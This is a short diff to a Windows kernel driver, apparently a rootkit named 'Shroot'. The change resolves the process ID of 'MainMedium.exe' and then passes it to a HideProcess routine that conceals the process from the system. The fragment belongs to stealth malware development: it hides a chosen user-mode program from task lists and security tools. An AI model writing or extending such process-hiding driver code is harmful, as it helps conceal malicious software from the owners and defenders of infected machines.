@@ -6,7 +6,7 @@
 extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING RegistryPath) {
     UNREFERENCED_PARAMETER(RegistryPath);
     UNREFERENCED_PARAMETER(DriverObject);
-
+    ULONG64 MediumPID = 0;
     //DriverObject->DriverUnload = ShrootUnload;
 
     
@@ -23,7 +23,11 @@ extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING Re
         //ShrootUnload(DriverObject);
         return STATUS_UNSUCCESSFUL;
     }
-    if (!NT_SUCCESS(process::HideProcess(0, "MainMedium.exe", TRUE))) {
+    if (!NT_SUCCESS(general_helpers::GetPidNameFromListADD(&MediumPID, "MainMedium.exe", TRUE)) || MediumPID == 0) {
+        //ShrootUnload(DriverObject);
+        return STATUS_UNSUCCESSFUL;
+    }
+    if (!NT_SUCCESS(process::HideProcess(MediumPID, TRUE))) {
         //ShrootUnload(DriverObject);
         return STATUS_UNSUCCESSFUL;
     }
